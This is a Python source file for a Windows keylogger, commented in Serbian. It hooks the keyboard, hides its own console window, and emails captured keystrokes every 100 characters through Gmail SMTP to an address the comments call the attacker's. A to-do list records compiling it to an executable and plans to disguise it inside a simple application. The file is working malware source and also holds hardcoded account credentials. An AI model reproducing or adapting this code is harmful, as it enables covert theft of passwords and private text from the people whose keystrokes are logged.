import pythoncom, pyHook
import threading
import smtplib
import datetime, time
import win32.win32console, win32.win32gui

# Globalni bafer u koji cuvamo keylogove
data = ''

# Klasa zaduzena za logovanje i slanje dumpa na email adresu napadaca
class TimerClass(threading.Thread):
    def run(self):
            global data                                                     # Preuzimamo bafer za slanje na mail
            ts = datetime.datetime.now()  
            timestamp = ts.strftime("%b %d %Y %H:%M:%S")                    # TIMESTAMP
            SERVER = "smtp.gmail.com"                                       # Ovom linijom dajemo server na koji saljemo, u ovom slucaju koristicemo gmail, i protokol Simple Mail Transfer Protocol
            PORT = 587                                                      # SMTP Protokol za slanje maila podrazumevano je 587, mada postoji jos opcija
            USER="testtestera99@gmail.com"                                  # Mail adresa sa koje cemo poslati logove
            PASS="stolica123"                                               # Lozinka naloga, koristimo fresh nalog da se izbegne mogucnost pracenja, nalog ne sadrzi informacije o napadacu
            FROM = USER                                                     # FROM segment mejla jeste nas ulogovani nalog
            TO = "milovanovicmmilos99@gmail.com"                            # TO segment je mail na koji saljemo dump
            SUBJECT = "Keylogger dump @timestamp{" + timestamp + "}:"       # Subject je naziv teme maila
            MESSAGE = data                                                  # MESSAGE jeste sam dump
            # Sledi formiranje maila koji je zapravo obican string, kako bi ispravno bili prikazani from, to, subject i body maila
            message = """\
From: %s
To: %s
Subject: %s
%s
""" % (FROM, TO, SUBJECT, MESSAGE)
            try:
                server = smtplib.SMTP()                                     # Kreiramo objekat SMTP klijenta iz smtplib paketa
                server.connect(SERVER, PORT)                                # Povezujemo se klijentom i datim portom
                print('Uspesno povezan na server')
                server.starttls()                                           # TLS protokol je zaduzen za enkripciju i bezbedan transport
                server.login(USER, PASS)                                    # Pokusaj da se ulogujemo na mail nalog
                print('Uspesno ulogovan')
                server.sendmail(FROM, TO, message)                          # Pokusaj slanja maila
                data=''                                                     # Cistimo bafer kako bi mogao da primi nove logove
                server.quit()                                               # Zatvaramo server
                print('Mejl poslat')
            except Exception as e:
                print(e)

# Izmenjena funkcija logovanja svakog karaktera ponaosob, odradjeno putem konkatenacije na globalni bafer
def keyPressed(event):
    global data

    key = chr(event.Ascii)
    data = data + key

    # Na svakih 100 karaktera saljemo dump na mail
    if len(data) > 100:
        emailClient = TimerClass()
        emailClient.run()

    return True

def hideConsole():
    #Skrivanje konzolnog prozora
    window = win32.win32console.GetConsoleWindow()
    win32.win32gui.ShowWindow(window, 0)

def run():
    hideConsole()

    obj = pyHook.HookManager()
    obj.KeyDown = keyPressed
    obj.HookKeyboard()
    pythoncom.PumpMessages()

'''
if __name__ == '__main__':
    run()
'''

# 1. SKRIPTU KOMPAJLIRATI U EXE FAJL POMOCU PYINSTALLERA [x]
# 2. UBACITI FUNKCIONALNOST SLANJA DUMPA NA MAIL ACCOUNT [x]
# 3. SAKRITI KONZOLNI PROZOR KEYLOGGERA                  [x]
# 4. SAKRITI KEYLOGGER U JEDNOSTAVNU APLIKACIJU